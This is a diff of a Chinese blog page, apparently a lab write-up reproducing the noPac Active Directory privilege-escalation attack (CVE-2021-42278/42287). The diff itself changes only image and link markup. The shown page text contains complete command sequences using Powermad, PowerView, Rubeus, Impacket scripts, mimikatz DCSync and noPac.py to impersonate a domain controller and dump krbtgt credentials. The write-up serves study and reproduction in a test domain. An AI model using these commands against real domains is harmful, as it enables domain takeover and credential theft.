@@ -401,74 +401,74 @@ CVE-2021-42287，使用 COMPUTER 的 TGT 通过另一个用户去请求 COM">
 <p>假如域内有一台域控名为 DC（域控对应的机器用户为 <code>DC$</code>），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户 <code>SAMTHEADMIN-48$</code>，再把机器用户 <code>SAMTHEADMIN-48$</code> 的 <code>sAMAccountName</code> 改成 <code>DC</code></p>
 <p>然后利用 <code>DC</code> 去申请一个 TGT 票据。再把 <code>DC</code> 的 <code>sAMAccountName</code> 改为 <code>SAMTHEADMIN-48$</code>。这个时候 KDC 就会判断域内没有 <code>DC</code> 这个用户，自动去搜索 <code>DC$</code>（<code>DC$</code> 是域内已经的域控 DC 的 <code>sAMAccountName</code>），攻击者利用刚刚申请的 TGT 进行 S4U2self，模拟域内的域管去请求域控 DC 的 ST 票据，最终获得域控制器 DC 的权限</p>
 <h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="检测漏洞是否存在"><a href="#检测漏洞是否存在" class="headerlink" title="检测漏洞是否存在"></a>检测漏洞是否存在</h2><p>这里利用 <a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a> 中的 scaner.py 来检测</p>
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910171113.png">&#x2F;Pasted image 20220910171113.png)</p>
+<p>![Pasted image 20220910171113.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910171113.png)</p>
 <p>可以看到可以请求不包含 PAC 的 TGT，所以该域控可以被攻击</p>
 <h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p>这里使用 了 <code>powermad</code> 和 <code>PowerView</code> 脚本</p>
 <p>创建机器账户</p>
 <pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$password</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">'1qaz2wsx'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force
 <span class="token function">New-MachineAccount</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Password $<span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">-</span>Domain <span class="token string">"merak.local"</span> <span class="token operator">-</span>DomainController <span class="token string">"DC.merak.local"</span> <span class="token operator">-</span>Verbose</code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910175306.png">&#x2F;Pasted image 20220910175306.png)</p>
+<p>![Pasted image 20220910175306.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910175306.png)</p>
 <p>清除新建机器账户的 SPN</p>
 <pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-DomainObject</span> <span class="token string">"CN=NewEvilMachine,CN=Computers,DC=merak,DC=local"</span> <span class="token operator">-</span>Clear <span class="token string">'serviceprincipalname'</span> <span class="token operator">-</span>Verbose</code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910202352.png">&#x2F;Pasted image 20220910202352.png)</p>
+<p>![Pasted image 20220910202352.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910202352.png)</p>
 <p>修改机器账户的用户名为域控的用户名，注意不带 <code>$</code></p>
 <pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-MachineAccountAttribute</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Value <span class="token string">"DC"</span> <span class="token operator">-</span>Attribute samaccountname <span class="token operator">-</span>Verbose</code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910203110.png">&#x2F;Pasted image 20220910203110.png)</p>
+<p>![Pasted image 20220910203110.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910203110.png)</p>
 <p>请求 TGT</p>
 <pre class="language-bashDC" data-language="bashDC"><code class="language-bashDC">Rubeus.exe asktgt &#x2F;user:&quot;DC&quot; &#x2F;password:&quot;1qaz2wsx&quot; &#x2F;domain:&quot;merak.local&quot; &#x2F;dc:&quot;DC.merak.local&quot; &#x2F;nowrap</code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910210604.png">&#x2F;Pasted image 20220910210604.png)</p>
+<p>![Pasted image 20220910210604.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910210604.png)</p>
 <p>恢复机器账户原用户名</p>
 <pre class="language-powershwll" data-language="powershwll"><code class="language-powershwll">Set-MachineAccountAttribute -MachineAccount &quot;NewEvilMachine&quot; -Value &quot;NewEvilMachine&quot; -Attribute samaccountname -Verbose</code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910212231.png">&#x2F;Pasted image 20220910212231.png)</p>
+<p>![Pasted image 20220910212231.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910212231.png)</p>
 <p>使用请求的 TGT 通过 S4U2self 获取 ST</p>
 <pre class="language-powershell" data-language="powershell"><code class="language-powershell">Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>self <span class="token operator">/</span>impersonateuser:<span class="token string">"administrator"</span> <span class="token operator">/</span>altservice:<span class="token string">"ldap/DC.merak.local"</span> <span class="token operator">/</span>dc:<span class="token string">"DC.merak.local"</span> <span class="token operator">/</span>ptt <span class="token operator">/</span>ticket:<span class="token namespace">[Base64 TGT]</span></code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910212825.png">&#x2F;Pasted image 20220910212825.png)</p>
+<p>![Pasted image 20220910212825.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910212825.png)</p>
 <p>验证</p>
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910213055.png">&#x2F;Pasted image 20220910213055.png)</p>
+<p>![Pasted image 20220910213055.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910213055.png)</p>
 <p>DCSync</p>
 <pre class="language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:merak.local /kdc:DC.merak.local /user:krbtgt"</span> <span class="token string">"exit"</span></code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910213342.png">&#x2F;Pasted image 20220910213342.png)</p>
+<p>![Pasted image 20220910213342.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910213342.png)</p>
 <h2 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h2><p>创建机器账户</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">python addcomputer.py -dc-ip <span class="token number">10.0</span>.100.10 -computer-name <span class="token string">'ImpacketEvilMachine$'</span> -computer-pass <span class="token string">'1qaz2wsx'</span> -dc-host DC -domain-netbios DC <span class="token string">'merak.local/xzz:Password123'</span></code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910214341.png">&#x2F;Pasted image 20220910214341.png)</p>
+<p>![Pasted image 20220910214341.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910214341.png)</p>
 <p>清除 SPN</p>
 <p>addspn.py 出自 <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">python addspn.py -u <span class="token string">'merak\xzz'</span> -p <span class="token string">'Password123'</span> -t <span class="token string">'ImpacketEvilMachine$'</span> -c DC.merak.local</code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910215313.png">&#x2F;Pasted image 20220910215313.png)</p>
+<p>![Pasted image 20220910215313.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910215313.png)</p>
 <p>修改机器账户用户名</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py">https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py</a></p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'ImpacketEvilMachine$'</span> -new-name <span class="token string">'DC'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910220735.png">&#x2F;Pasted image 20220910220735.png)</p>
+<p>![Pasted image 20220910220735.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910220735.png)</p>
 <p>请求 TGT</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">python getTGT.py -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC:1qaz2wsx'</span></code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910223444.png">&#x2F;Pasted image 20220910223444.png)</p>
+<p>![Pasted image 20220910223444.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910223444.png)</p>
 <p>恢复机器账户用户名</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'DC'</span> -new-name <span class="token string">'ImpacketEvilMachine$'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910221237.png">&#x2F;Pasted image 20220910221237.png)</p>
+<p>![Pasted image 20220910221237.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910221237.png)</p>
 <p>使用请求的 TGT 通过 S4U2self 获取 ST</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span><span class="token string">'DC.ccache'</span>
 python getST.py -impersonate <span class="token string">'administrator'</span> -spn <span class="token string">'cifs/DC.merak.local'</span> -k -no-pass -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC'</span></code></pre>
 
 <p>失败，原因暂未可知</p>
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220911110934.png">&#x2F;Pasted image 20220911110934.png)</p>
+<p>![Pasted image 20220911110934.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220911110934.png)</p>
 <p>附一个成功的截图</p>
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220911111232.png">&#x2F;Pasted image 20220911111232.png)</p>
+<p>![Pasted image 20220911111232.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220911111232.png)</p>
 <h2 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h2><p><a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">python noPac.py merak.local/zs:<span class="token string">'Password123'</span> -dc-ip DC.merak.local -shell --impersonate administrator </code></pre>
 
-<p><img src="/posts/CVE-2021-42278-&-CVE-2021-42287-(NoPac" alt="Pasted image 20220910230856.png">&#x2F;Pasted image 20220910230856.png)</p>
+<p>![Pasted image 20220910230856.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910230856.png)</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1380">https://tttang.com/archive/1380</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10666">https://xz.aliyun.com/t/10666</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10694">https://xz.aliyun.com/t/10694</a></p>
@@ -499,7 +499,7 @@ python getST.py -impersonate <span class="token string">'administrator'</span> -
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Zh0um1.github.io/posts/0">http://Zh0um1.github.io/posts/0</a>
+                    <a href="http://Zh0um1.github.io/posts/f80a473a">http://Zh0um1.github.io/posts/f80a473a</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -591,7 +591,7 @@ python getST.py -impersonate <span class="token string">'administrator'</span> -
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/posts/0">
+                <a href="/posts/f80a473a">
                     <div class="card-image">
                         
                         
